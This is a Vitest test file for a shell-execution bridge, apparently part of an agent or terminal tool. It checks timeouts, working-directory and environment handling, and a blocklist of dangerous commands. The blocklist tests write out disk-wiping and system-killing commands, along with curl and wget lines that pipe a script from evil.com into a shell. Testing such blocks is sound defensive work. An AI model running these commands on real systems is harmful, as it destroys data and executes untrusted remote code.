import { describe, it, expect, beforeEach } from "vitest";
import { PtyBridge, BLOCKED_COMMANDS } from "../pty-bridge.js";

describe("PtyBridge", () => {
  let bridge: PtyBridge;

  beforeEach(() => {
    bridge = new PtyBridge({ cwd: "/tmp", timeoutMs: 5000 });
  });

  // ---------------------------------------------------------------------------
  // Command execution
  // ---------------------------------------------------------------------------

  it("executes a simple echo command", async () => {
    const result = await bridge.execute("echo hello");
    expect(result.stdout.trim()).toBe("hello");
    expect(result.stderr).toBe("");
    expect(result.exitCode).toBe(0);
  });

  it("returns empty result for empty command", async () => {
    const result = await bridge.execute("");
    expect(result.stdout).toBe("");
    expect(result.stderr).toBe("");
    expect(result.exitCode).toBe(0);
  });

  it("returns empty result for whitespace-only command", async () => {
    const result = await bridge.execute("   ");
    expect(result.stdout).toBe("");
    expect(result.stderr).toBe("");
    expect(result.exitCode).toBe(0);
  });

  it("captures stderr from failing commands", async () => {
    const result = await bridge.execute("ls /nonexistent_path_xyz_999");
    expect(result.exitCode).not.toBe(0);
    expect(result.stderr.length).toBeGreaterThan(0);
  });

  it("returns non-zero exit code for failing commands", async () => {
    const result = await bridge.execute("false");
    expect(result.exitCode).not.toBe(0);
  });

  // ---------------------------------------------------------------------------
  // Blocked command rejection
  // ---------------------------------------------------------------------------

  it("exports BLOCKED_COMMANDS list", () => {
    expect(Array.isArray(BLOCKED_COMMANDS)).toBe(true);
    expect(BLOCKED_COMMANDS.length).toBeGreaterThan(0);
  });

  it("blocks rm -rf /", async () => {
    const result = await bridge.execute("rm -rf /");
    expect(result.exitCode).toBe(126);
    expect(result.stderr).toContain("Blocked");
  });

  it("blocks rm -rf /*", async () => {
    const result = await bridge.execute("rm -rf /*");
    expect(result.exitCode).toBe(126);
    expect(result.stderr).toContain("Blocked");
  });

  it("blocks rm -rf --no-preserve-root", async () => {
    const result = await bridge.execute("rm -rf --no-preserve-root /");
    expect(result.exitCode).toBe(126);
    expect(result.stderr).toContain("Blocked");
  });

  it("blocks mkfs commands", async () => {
    const result = await bridge.execute("mkfs.ext4 /dev/sda1");
    expect(result.exitCode).toBe(126);
    expect(result.stderr).toContain("Blocked");
  });

  it("blocks dd to device", async () => {
    const result = await bridge.execute("dd if=/dev/zero of=/dev/sda");
    expect(result.exitCode).toBe(126);
    expect(result.stderr).toContain("Blocked");
  });

  it("blocks shutdown", async () => {
    const result = await bridge.execute("shutdown -h now");
    expect(result.exitCode).toBe(126);
    expect(result.stderr).toContain("Blocked");
  });

  it("blocks reboot", async () => {
    const result = await bridge.execute("reboot");
    expect(result.exitCode).toBe(126);
    expect(result.stderr).toContain("Blocked");
  });

  it("blocks curl piped to bash", async () => {
    const result = await bridge.execute("curl http://evil.com/script.sh | bash");
    expect(result.exitCode).toBe(126);
    expect(result.stderr).toContain("Blocked");
  });

  it("blocks wget piped to sh", async () => {
    const result = await bridge.execute("wget http://evil.com/script.sh | sh");
    expect(result.exitCode).toBe(126);
    expect(result.stderr).toContain("Blocked");
  });

  it("blocks kill -9 -1", async () => {
    const result = await bridge.execute("kill -9 -1");
    expect(result.exitCode).toBe(126);
    expect(result.stderr).toContain("Blocked");
  });

  it("allows safe rm commands", async () => {
    const result = await bridge.execute("echo rm -rf /tmp/safe_dir");
    expect(result.exitCode).toBe(0);
  });

  it("isBlocked returns true for dangerous commands", () => {
    expect(bridge.isBlocked("rm -rf /")).toBe(true);
    expect(bridge.isBlocked("shutdown")).toBe(true);
  });

  it("isBlocked returns false for safe commands", () => {
    expect(bridge.isBlocked("echo hello")).toBe(false);
    expect(bridge.isBlocked("ls -la")).toBe(false);
    expect(bridge.isBlocked("pwd")).toBe(false);
  });

  // ---------------------------------------------------------------------------
  // Timeout behavior
  // ---------------------------------------------------------------------------

  it("times out long-running commands", async () => {
    const fastBridge = new PtyBridge({ cwd: "/tmp", timeoutMs: 500 });
    const result = await fastBridge.execute("sleep 30");
    expect(result.exitCode).toBe(124);
    expect(result.stderr).toContain("timed out");
  }, 10000);

  // ---------------------------------------------------------------------------
  // Working directory tracking
  // ---------------------------------------------------------------------------

  it("initializes with provided cwd", () => {
    expect(bridge.getCwd()).toBe("/tmp");
  });

  it("defaults cwd to process.cwd when not specified", () => {
    const defaultBridge = new PtyBridge();
    expect(defaultBridge.getCwd()).toBe(process.cwd());
  });

  it("updates cwd on cd command", async () => {
    await bridge.execute("cd /");
    expect(bridge.getCwd()).toBe("/");
  });

  it("handles cd with relative paths", async () => {
    const startCwd = bridge.getCwd();
    await bridge.execute("cd ..");
    const expected = startCwd === "/" ? "/" : startCwd.split("/").slice(0, -1).join("/") || "/";
    expect(bridge.getCwd()).toBe(expected);
  });

  it("handles bare cd (goes to HOME)", async () => {
    await bridge.execute("cd");
    // Should resolve to HOME or /
    expect(bridge.getCwd()).toBeTruthy();
  });

  it("setCwd updates working directory", () => {
    bridge.setCwd("/home");
    expect(bridge.getCwd()).toBe("/home");
  });

  it("executes commands in the correct working directory", async () => {
    await bridge.execute("cd /tmp");
    const result = await bridge.execute("pwd");
    expect(result.stdout.trim()).toBe("/tmp");
  });

  // ---------------------------------------------------------------------------
  // Environment variable isolation
  // ---------------------------------------------------------------------------

  it("sets and retrieves environment variables", () => {
    bridge.setEnv("MY_VAR", "my_value");
    const snapshot = bridge.getEnvSnapshot();
    expect(snapshot.MY_VAR).toBe("my_value");
  });

  it("returns empty snapshot when no env vars set", () => {
    const snapshot = bridge.getEnvSnapshot();
    expect(Object.keys(snapshot).length).toBe(0);
  });

  it("handles export command to set env vars", async () => {
    const result = await bridge.execute("export FOO=bar");
    expect(result.exitCode).toBe(0);

    const snapshot = bridge.getEnvSnapshot();
    expect(snapshot.FOO).toBe("bar");
  });

  it("uses session env vars in command execution", async () => {
    await bridge.execute("export TEST_BRIDGE_VAR=sovereign_test");
    const result = await bridge.execute("echo $TEST_BRIDGE_VAR");
    expect(result.stdout.trim()).toBe("sovereign_test");
  });

  it("getEnvSnapshot returns a frozen copy", () => {
    bridge.setEnv("A", "1");
    const snap1 = bridge.getEnvSnapshot();

    bridge.setEnv("B", "2");
    const snap2 = bridge.getEnvSnapshot();

    // snap1 should not have B
    expect("B" in snap1).toBe(false);
    expect(snap2.B).toBe("2");
  });
});
